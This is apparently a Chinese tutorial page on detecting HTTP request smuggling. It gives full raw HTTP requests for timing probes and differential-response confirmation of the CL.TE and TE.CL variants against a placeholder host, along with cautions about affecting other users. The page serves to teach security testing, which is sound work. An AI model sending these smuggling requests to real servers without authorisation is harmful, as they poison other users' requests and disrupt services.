+++
draft = false
date = 2021-03-04T00:00:00+08:00
title = "Finding request smuggling"
description = "Finding request smuggling"
slug = ""
authors = []
tags = []
categories = ["web security"]
externalLink = ""
series = []
disableComments = true
+++

# 查找 HTTP 请求走私漏洞

在本节中，我们将介绍用于查找 HTTP 请求走私漏洞的不同技术。


## 计时技术

检测 HTTP 请求走私漏洞的最普遍有效的方法就是计时技术。发送请求，如果存在漏洞，则应用程序的响应会出现时间延迟。


### 使用计时技术查找 CL.TE 漏洞

如果应用存在 `CL.TE` 漏洞，那么发送如下请求通常会导致时间延迟：

<code>
    <span style="color:blue">
        POST / HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Transfer-Encoding: chunked<br>
        Content-Length: 4<br>
        <br>
        1<br>
        A
    </span>
    <br>
    <span style="color:orange">X</span>
</code>


前端服务器（转发服务）使用 `Content-Length` 认为消息体只有 4 个字节，即 `1\r\nA`，因此后面的 `X` 被忽略了，然后把这个请求转发给后端。而后端服务使用 `Transfer-Encoding` 则会一直等待终止分块 `0\r\n` 。这就会导致明显的响应延迟。


### 使用计时技术查找 TE.CL 漏洞

如果应用存在 `TE.CL` 漏洞，那么发送如下请求通常会导致时间延迟：

<code>
    <span style="color:blue">
        POST / HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Transfer-Encoding: chunked<br>
        Content-Length: 6<br>
        <br>
        0<br>
        </span>
        <br>
    <span style="color:orange">X</span>
</code>

前端服务器（转发服务）使用 `Transfer-Encoding`，由于第一个分块就是 `0\r\n` 终止分块，因此后面的 `X` 直接被忽略了，然后把这个请求转发给后端。而后端服务使用 `Content-Length` 则会一直等到后续 6 个字节的内容。这就会导致明显的延迟。

注意：如果应用程序易受 `CL.TE` 漏洞的攻击，则基于时间的 `TE.CL` 漏洞测试可能会干扰其他应用程序用户。因此，为了隐蔽并尽量减少干扰，你应该先进行 `CL.TE` 测试，只有在失败了之后再进行 `TE.CL` 测试。


## 使用差异响应确认 HTTP 请求走私漏洞

当检测到可能的请求走私漏洞时，可以通过利用该漏洞触发应用程序响应内容的差异来获取该漏洞进一步的证据。这包括连续向应用程序发送两个请求：
- 一个攻击请求，旨在干扰下一个请求的处理。
- 一个正常请求。

如果对正常请求的响应包含预期的干扰，则漏洞被确认。

例如，假设正常请求如下：
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

这个请求通常会收到状态码为 200 的 HTTP 响应，响应内容包含一些搜索结果。

攻击请求则取决于请求走私是 `CL.TE` 还是 `TE.CL` 。


### 使用差异响应确认 CL.TE 漏洞

为了确认 `CL.TE` 漏洞，你可以发送如下攻击请求：

<code>
    <span style="color:blue">
        POST /search HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 49<br>
        Transfer-Encoding: chunked<br>
        <br>
        e<br>
        q=smuggling&amp;x=<br>
        0<br>
        <br>
    </span>
    <span style="color:orange">
        GET /404 HTTP/1.1<br>
        Foo: x
    </span>
</code>

如果攻击成功，则最后两行会被后端服务视为下一个请求的开头。这将导致紧接着的一个正常的请求变成了如下所示：

<code>
    <span style="color:orange">
        GET /404 HTTP/1.1<br>
        Foo: x</span><span style="color:green">POST /search HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 11<br>
        <br>
        q=smuggling
    </span>
</code>

由于这个请求的 URL 现在是一个无效的地址，因此服务器将会作出 404 的响应，这表明攻击请求确实产生了干扰。


### 使用差异响应确认 TE.CL 漏洞

为了确认 `TE.CL` 漏洞，你可以发送如下攻击请求：

<code>
    <span style="color:blue">
        POST /search HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 4<br>
        Transfer-Encoding: chunked<br>
        <br>
        7c<br></span>
        <span style="color:orange">GET /404 HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 144<br>
        <br>
        x=<br>
        0<br>
        <br>
    </span>
</code>

如果攻击成功，则后端服务器将从 `GET / 404` 以后的所有内容都视为属于收到的下一个请求。这将会导致随后的正常请求变为：

<code>
    <span style="color:orange">
        GET /404 HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 146<br>
        <br>
        x=<br>
        0<br>
        <br>
    </span> <span style="color:green">
        POST /search HTTP/1.1<br>
        Host: vulnerable-website.com<br>
        Content-Type: application/x-www-form-urlencoded<br>
        Content-Length: 11<br>
        <br>
        q=smuggling
    </span>
</code>

由于这个请求的 URL 现在是一个无效的地址，因此服务器将会作出 404 的响应，这表明攻击请求确实产生了干扰。


注意，当试图通过干扰其他请求来确认请求走私漏洞时，应记住一些重要的注意事项：
- “攻击”请求和“正常”请求应该使用不同的网络连接发送到服务器。通过同一个连接发送两个请求不会证明该漏洞存在。
- “攻击”请求和“正常”请求应尽可能使用相同的URL和参数名。这是因为许多现代应用程序根据URL和参数将前端请求路由到不同的后端服务器。使用相同的URL和参数会增加请求被同一个后端服务器处理的可能性，这对于攻击起作用至关重要。
- 当测试“正常”请求以检测来自“攻击”请求的任何干扰时，您与应用程序同时接收的任何其他请求（包括来自其他用户的请求）处于竞争状态。您应该在“攻击”请求之后立即发送“正常”请求。如果应用程序正忙，则可能需要执行多次尝试来确认该漏洞。
- 在某些应用中，前端服务器充当负载均衡器，根据某种负载均衡算法将请求转发到不同的后端系统。如果您的“攻击”和“正常”请求被转发到不同的后端系统，则攻击将失败。这是您可能需要多次尝试才能确认漏洞的另一个原因。
- 如果您的攻击成功地干扰了后续请求，但这不是您为检测干扰而发送的“正常”请求，那么这意味着另一个应用程序用户受到了您的攻击的影响。如果您继续执行测试，这可能会对其他用户产生破坏性影响，您应该谨慎行事。